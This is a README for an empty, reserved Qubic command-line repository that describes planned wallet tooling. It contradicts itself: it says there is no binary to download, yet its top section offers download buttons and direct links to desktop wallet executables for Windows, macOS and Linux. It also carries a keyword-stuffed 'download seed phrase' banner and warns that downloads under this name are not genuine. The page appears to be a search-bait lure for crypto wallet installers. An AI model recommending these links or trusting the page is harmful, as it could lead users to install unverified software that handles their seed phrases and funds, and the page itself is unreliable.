![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-app-banner.png)

# Qubic CLI

Command-line tooling for Qubic. Reserved: nothing published yet.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> A home for Qubic on the command line. The repository is reserved and being prepared: nothing is published
> here yet, and this page will change the moment the first tool lands.

## Why a CLI

Not every Qubic task belongs in a window. Scripting a balance check, wiring a transfer into a deployment,
or watching a tick from a terminal on a server with no desktop are all jobs where a command is the right
shape and a wallet window is not. `qubic-cli` exists to hold that tooling under the same account as the
wallet and its documentation, so the same people who maintain the desktop wallet can publish the terminal
side of it.

The repository is currently empty. There is no package to install, no binary to download and no usage
guide, and this README says so rather than describing features that do not exist yet. That is deliberate:
a placeholder that promises a command that answers 404 wastes more of your time than a page that admits
the shelf is still bare.

## What belongs here

- Commands that mirror the wallet's core jobs: account creation and recovery, balance and history lookup,
  and sending assets.
- Non-interactive tooling for servers: run it from a script, read the result, exit with a useful code.
- Small, honest utilities that make the Qubic network easier to work with from a terminal.

What does not belong here: anything that needs your seed on a machine you do not control, anything that
cannot be reviewed in public, and anything that duplicates the desktop wallet for its own sake.

## Where to go today

The desktop wallet is the supported way to hold and move Qubic assets right now, and the guides below
cover the tasks a command line would eventually offer:

- [How to send QU and other Qubic assets from the desktop wallet](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-send-qu-tokens.md) -
  the send flow, field by field, including the point after which it cannot be cancelled.
- [Finding a Qubic Wallet transaction history and TXID](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-transaction-history.md) -
  where history lives and how to quote a transaction when you need to.
- [Qubic Wallet CLI and API surface for developers](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-cli-api-developers.md) -
  what the wallet itself exposes today, and where the interface boundaries sit.

## Staying honest about the wait

When the first release is ready it will appear on this repository's releases page with a checksum, and
the documentation set will link to it from the developer page. Until then, watch the repository rather
than a rumour: no announcement exists anywhere else, and any download offered under this name before
then is not from this account.

If you want to influence what ships first, the most useful signal is which task you would script before
any other: sending an asset, checking a balance, or reading transaction history for a batch of addresses.

## The shape of the wait

A good command-line tool for Qubic should be boring in the best sense: one job per command, output that
pipes, exit codes that mean something, and no interactive prompt that a script cannot answer. That is the
bar this repository is being prepared against, and it is why nothing has been published here yet. Shipping
a half-command that changes its flags twice before the first release teaches people to distrust the tool.

## What good looks like here

- One command, one answer, printed as data rather than as prose.
- Every failure distinguishable from every other failure by its exit code.
- No seed ever passed on a command line where it lands in shell history.
- Documentation that a reader can finish in one sitting, like this page.

## Until then

Use the desktop wallet for anything that holds keys, and the guides linked above for the tasks a command
line would eventually cover. When the first tool lands, this page becomes its quick start and the release
page becomes its changelog; neither exists yet, and saying so is the most useful thing this README can do
today.
## Following along

The repository is public while it is being prepared, which means you can watch the work rather than wait
for an announcement. Stars are not a release schedule and this page will never pretend they are: the only
signal that a tool is available is a file on the releases page with a checksum beside it.

## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
